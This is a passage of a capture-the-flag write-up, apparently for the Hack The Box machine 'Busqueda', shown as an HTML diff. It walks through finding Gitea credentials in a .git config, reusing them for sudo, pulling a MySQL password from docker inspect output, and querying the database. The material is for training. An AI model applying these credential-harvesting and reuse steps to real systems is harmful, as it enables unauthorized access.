+</span><span class="z-source z-python">                <span class="z-keyword z-control z-flow z-return z-python">return</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">redirect</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">url</span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-variable z-parameter z-python">code</span><span class="z-keyword z-operator z-assignment z-python">=</span><span class="z-constant z-numeric z-integer z-decimal z-python">302</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">            <span class="z-meta z-statement z-conditional z-else z-python"><span class="z-keyword z-control z-conditional z-else z-python">else</span><span class="z-punctuation z-section z-block z-conditional z-else z-python">:</span></span>
+</span><span class="z-source z-python">                <span class="z-keyword z-control z-flow z-return z-python">return</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">url</span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">        <span class="z-meta z-statement z-conditional z-else z-python"><span class="z-keyword z-control z-conditional z-else z-python">else</span><span class="z-punctuation z-section z-block z-conditional z-else z-python">:</span></span>
+</span><span class="z-source z-python">            <span class="z-keyword z-control z-flow z-return z-python">return</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">render_template</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span>
+</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python">                <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">index.html<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-variable z-parameter z-python">options</span><span class="z-keyword z-operator z-assignment z-python">=</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">Engine</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-support z-variable z-magic z-python">__members__</span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-variable z-parameter z-python">error</span><span class="z-keyword z-operator z-assignment z-python">=</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">Invalid engine!<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
+</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python">            <span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">    <span class="z-meta z-statement z-exception z-catch z-python"><span class="z-keyword z-control z-exception z-catch z-python">except</span> <span class="z-support z-type z-exception z-python">Exception</span> <span class="z-keyword z-control z-exception z-catch z-as z-python">as</span></span><span class="z-meta z-statement z-exception z-catch z-python"> <span class="z-meta z-generic-name z-python">e</span></span><span class="z-meta z-statement z-exception z-catch z-python"><span class="z-punctuation z-section z-block z-exception z-catch z-python">:</span></span>
+</span><span class="z-source z-python">        <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-support z-function z-builtin z-python">print</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">e</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">        <span class="z-keyword z-control z-flow z-return z-python">return</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">render_template</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span>
+</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python">            <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">index.html<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-variable z-parameter z-python">options</span><span class="z-keyword z-operator z-assignment z-python">=</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">Engine</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-support z-variable z-magic z-python">__members__</span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-variable z-parameter z-python">error</span><span class="z-keyword z-operator z-assignment z-python">=</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">Something went wrong!<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
+</span></span><span class="z-source z-python"><span class="z-meta z-function-call z-arguments z-python">        <span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python"><span class="z-keyword z-operator z-comparison z-python">&lt;</span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-other z-constant z-python">SNIP</span></span><span class="z-keyword z-operator z-comparison z-python">&gt;</span>
+</span></code></pre>
+<p>The <code>app.py</code> file uses Flask under the hood, as we already discovered. It's a
+really simple app, it only contains two routes: <code>/</code>, which renders the
+<code>index.html</code> template, and <code>/search</code>, which handles form submission via the POST
+method.</p>
+<p>We also find a <code>.git</code> folder. This must be why we found a <code>.gitconfig</code> file in
+our home folder!</p>
+<p>The <code>config</code> file is particularly interesting:</p>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">[remote &quot;origin&quot;]
+</span><span class="z-text z-plain">    url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+</span><span class="z-text z-plain">    fetch = +refs/heads/*:refs/remotes/origin/*
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>It discloses the presence of a Git repository on Gitea, which can be accessed at
+the subdomain <code>gitea.searcher.htb</code>, as well as credentials used to access it:
+<code>cody</code>:<code>jh1usoih2bkjaspwe92</code>.</p>
+<blockquote>
+<p>The goal of this project is to make the easiest, fastest, and most painless
+way of setting up a self-hosted Git service.</p>
+<p>— <a href="https://github.com/go-gitea/gitea">GitHub</a></p>
+</blockquote>
+<p>I'll add this subdomain to my <code>/etc/hosts</code> file.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> echo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.208 gitea.searcher.htb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;&gt;</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/hosts<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<h2 id="services-enumeration-1">Services enumeration</h2>
+<h3 id="apache-1">Apache</h3>
+<h4 id="exploration-2">Exploration</h4>
+<p>Let's browse to <code>http://gitea.searcher.htb/</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/subdomain-homepage.png" alt="Subdomain homepage" /></p>
+<p>This is a standard Gitea installation.</p>
+<h4 id="fingerprinting-2">Fingerprinting</h4>
+<p>Let's fingerprint the technologies used by this web page with the
+<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/subdomain-homepage-wappalyzer.png" alt="Subdomain homepage Wappalyzer extension" /></p>
+<p>Moreover, the footer of the website leaks that it's using Gitea version
+<code>1.18.0+rc1</code>.</p>
+<h4 id="exploration-3">Exploration</h4>
+<p>Without logging in, we can't find any repository. We can list the users though:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/subdomain-users-page.png" alt="Subdomain users page" /></p>
+<p>There's <code>cody</code> and <code>administrator</code>.</p>
+<p>Let's log in using the credentials we find <a href="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/#website-code-review">earlier</a>.</p>
+<p>Now we have access to the <code>Searcher_site</code> repository:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/busqueda/subdomain-searcher-repository.png" alt="Subdomain searcher repository" /></p>
+<p>However, we find nothing new, it's the same as the version on the system.</p>
+<p>I tried to log in as <code>administrator</code> with the same password as <code>cody</code>, but it
+failed.</p>
+<h2 id="system-enumeration-1">System enumeration</h2>
+<h3 id="sudo-permissions">Sudo permissions</h3>
+<p>Let's see if we can execute anything as another user with <code>sudo</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">svc@busqueda:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>l</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">[sudo] password for svc:
+</span></code></pre>
+<p>We're asked to enter a password. Let's enter the same as for <code>cody</code>'s Gitea
+account, <code>jh1usoih2bkjaspwe92</code>.</p>
+<pre class="z-code"><code><span class="z-text z-plain">[sudo] password for svc:
+</span><span class="z-text z-plain">Matching Defaults entries for svc on busqueda:
+</span><span class="z-text z-plain">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">User svc may run the following commands on busqueda:
+</span><span class="z-text z-plain">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+</span></code></pre>
+<p>It worked! We can execute the <code>system-checkup.py</code> script in <code>/opt/scripts</code> with
+the <code>*</code> argument as <code>root</code>.</p>
+<h3 id="exploring-opt-scripts">Exploring <code>/opt/scripts</code></h3>
+<p>Let's retrieve the content of this folder.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">svc@busqueda:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>la</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/opt/scripts<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">drwxr-xr-x 3 root root 4096 Dec 24  2022 .
+</span><span class="z-text z-plain">drwxr-xr-x 4 root root 4096 Mar  1  2023 ..
+</span><span class="z-text z-plain">-rwx--x--x 1 root root  586 Dec 24  2022 check-ports.py
+</span><span class="z-text z-plain">-rwx--x--x 1 root root  857 Dec 24  2022 full-checkup.sh
+</span><span class="z-text z-plain">drwxr-x--- 8 root root 4096 Apr  3  2023 .git
+</span><span class="z-text z-plain">-rwx--x--x 1 root root 3346 Dec 24  2022 install-flask.sh
+</span><span class="z-text z-plain">-rwx--x--x 1 root root 1903 Dec 24  2022 system-checkup.py
+</span></code></pre>
+<p>It contains the <code>system-checkup.py</code> file, which we can execute with <code>sudo</code>, but
+also <code>check-ports.py</code>, <code>full-checkup.sh</code> and <code>install-flask.sh</code>. Unfortunately,
+we don't have the necessary rights to read or write to these files.</p>
+<p>We also notice a <code>.git</code> file... maybe it corresponds to a repository on Gitea?</p>
+<h3 id="inspecting-opt-scripts-system-checkup-py">Inspecting <code>/opt/scripts/system-checkup.py</code></h3>
+<p>We can only execute this file, so let's do it.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">svc@busqueda:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/bin/python3<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/opt/scripts/system-checkup.py<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>*<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">     docker-ps     : List running docker containers
+</span><span class="z-text z-plain">     docker-inspect : Inpect a certain docker container
+</span><span class="z-text z-plain">     full-checkup  : Run a full system checkup
+</span></code></pre>
+<p>We can give three different arguments to this program. Let's try all of them.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">svc@busqueda:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/bin/python3<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/opt/scripts/system-checkup.py<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>docker-ps<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS          PORTS                                             NAMES
+</span><span class="z-text z-plain">960873171e2e   gitea/gitea:latest   &quot;/usr/bin/entrypoint…&quot;   13 months ago   Up 39 minutes   127.0.0.1:3000-&gt;3000/tcp, 127.0.0.1:222-&gt;22/tcp   gitea
+</span><span class="z-text z-plain">f84a6b33fb5a   mysql:8              &quot;docker-entrypoint.s…&quot;   13 months ago   Up 39 minutes   127.0.0.1:3306-&gt;3306/tcp, 33060/tcp               mysql_db
+</span></code></pre>
+<p>This command corresponds to <code>docker ps</code>. It indicates that there's two
+containers running, one for <code>gitea</code> and one for <code>mysql_db</code>.</p>
+<p>We already explored Gitea, but we found nothing noteworthy. However, we didn't
+explore MySQL! The issue is that it's running inside a container, and we don't
+have this container's IP.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">svc@busqueda:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/bin/python3<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/opt/scripts/system-checkup.py<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>docker-inspect<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Usage: /opt/scripts/system-checkup.py docker-inspect &lt;format&gt; &lt;container_name&gt;
+</span></code></pre>
+<p>This command corresponds to <code>docker inspect</code>. We need to specify a format and a
+container name. If we search online, we find a
+<a href="https://docs.docker.com/config/formatting/">docs page</a> that indicates the
+syntax used to format output.</p>
+<p>Let's inspect the <code>gitea</code> container:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">svc@busqueda:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/bin/python3<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/opt/scripts/system-checkup.py<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>docker-inspect<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>{{json .}}<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>gitea<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">jq</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>.<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>indent</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>4<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">&quot;Env&quot;: [
+</span><span class="z-text z-plain">    &quot;USER_UID=115&quot;,
+</span><span class="z-text z-plain">    &quot;USER_GID=121&quot;,
+</span><span class="z-text z-plain">    &quot;GITEA__database__DB_TYPE=mysql&quot;,
+</span><span class="z-text z-plain">    &quot;GITEA__database__HOST=db:3306&quot;,
+</span><span class="z-text z-plain">    &quot;GITEA__database__NAME=gitea&quot;,
+</span><span class="z-text z-plain">    &quot;GITEA__database__USER=gitea&quot;,
+</span><span class="z-text z-plain">    &quot;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&quot;,
+</span><span class="z-text z-plain">    &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,
+</span><span class="z-text z-plain">    &quot;USER=git&quot;,
+</span><span class="z-text z-plain">    &quot;GITEA_CUSTOM=/data/gitea&quot;
+</span><span class="z-text z-plain">],
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>The output is really long, so I only included the interesting part. It indicates
+that Gitea uses MySQL to manage authentication credentials. To connect to MySQL,
+it uses the credentials <code>gitea</code>:<code>yuiu1hoiu4i5ho1uh</code>.</p>
+<p>We have credentials to connect to MySQL, but we still don't know how to connect
+to it. Let's retrieve the IP of the <code>mysql_db</code> container:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">svc@busqueda:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/bin/python3<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/opt/scripts/system-checkup.py<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>docker-inspect<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>{{json .NetworkSettings.Networks}}<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>mysql_db<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">jq</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>.<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>indent</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>4<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">{
+</span><span class="z-text z-plain">    &quot;docker_gitea&quot;: {
+</span><span class="z-text z-plain">        &quot;IPAMConfig&quot;: null,
+</span><span class="z-text z-plain">        &quot;Links&quot;: null,
+</span><span class="z-text z-plain">        &quot;Aliases&quot;: [
+</span><span class="z-text z-plain">            &quot;f84a6b33fb5a&quot;,
+</span><span class="z-text z-plain">            &quot;db&quot;
+</span><span class="z-text z-plain">        ],
+</span><span class="z-text z-plain">        &quot;NetworkID&quot;: &quot;cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227&quot;,
+</span><span class="z-text z-plain">        &quot;EndpointID&quot;: &quot;03701e8c3a84bb8e41ae83757d57b6f11544629269fabf74b1de122bfe74d3cc&quot;,
+</span><span class="z-text z-plain">        &quot;Gateway&quot;: &quot;172.19.0.1&quot;,
+</span><span class="z-text z-plain">        &quot;IPAddress&quot;: &quot;172.19.0.2&quot;,
+</span><span class="z-text z-plain">        &quot;IPPrefixLen&quot;: 16,
+</span><span class="z-text z-plain">        &quot;IPv6Gateway&quot;: &quot;&quot;,
+</span><span class="z-text z-plain">        &quot;GlobalIPv6Address&quot;: &quot;&quot;,
+</span><span class="z-text z-plain">        &quot;GlobalIPv6PrefixLen&quot;: 0,
+</span><span class="z-text z-plain">        &quot;MacAddress&quot;: &quot;02:42:ac:13:00:02&quot;,
+</span><span class="z-text z-plain">        &quot;DriverOpts&quot;: null
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">}
+</span></code></pre>
+<p>It's <code>172.19.0.2</code>!</p>
+<p>We haven't tried the last command argument though, so let's do it.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">svc@busqueda:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/bin/python3<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/opt/scripts/system-checkup.py<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>full-checkup<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Something went wrong
+</span></code></pre>
+<p>We get an error message.</p>
+<h1 id="host-172-19-0-2">Host <code>172.19.0.2</code></h1>
+<h2 id="services-enumeration-2">Services enumeration</h2>
+<h3 id="mysql">MySQL</h3>
+<p>Let's connect to the MySQL server running inside the Docker container with IP
+<code>172.19.0.2</code>, from the host <code>10.10.11.208</code>, using the credentials in the Gitea
+configuration:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">svc@busqueda:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> mysql<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>h</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>172.19.0.2<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>gitea<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span><span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>yuiu1hoiu4i5ho1uh<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">mysql&gt;
+</span></code></pre>
+<h4 id="version">Version</h4>
+<p>Let's find out the version of MySQL in use.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mysql</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> SELECT @@version</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">+-----------+
+</span><span class="z-text z-plain">| @@version |
+</span><span class="z-text z-plain">+-----------+
+</span><span class="z-text z-plain">| 8.0.31    |
+</span><span class="z-text z-plain">+-----------+
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>So it's MySQL version <code>8.0.31</code>.</p>
+<h4 id="databases">Databases</h4>
+<p>Now, let's see which databases are available.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mysql</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> SHOW databases</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">+--------------------+
+</span><span class="z-text z-plain">| Database           |
+</span><span class="z-text z-plain">+--------------------+
+</span><span class="z-text z-plain">| gitea              |
+</span><span class="z-text z-plain">| information_schema |
+</span><span class="z-text z-plain">| performance_schema |
+</span><span class="z-text z-plain">+--------------------+
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>The <code>gitea</code> database is the only non-default one.</p>
+<h4 id="gitea-s-tables"><code>gitea</code>'s tables</h4>
+<p>Let's see which tables are included in this database.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mysql</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> SHOW tables</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">+---------------------------+
+</span><span class="z-text z-plain">| Tables_in_gitea           |
+</span><span class="z-text z-plain">+---------------------------+
+</span><span class="z-text z-plain">| access                    |
+</span><span class="z-text z-plain">| access_token              |
+</span><span class="z-text z-plain">| action                    |
+</span><span class="z-text z-plain">| app_state                 |
+</span><span class="z-text z-plain">| attachment                |
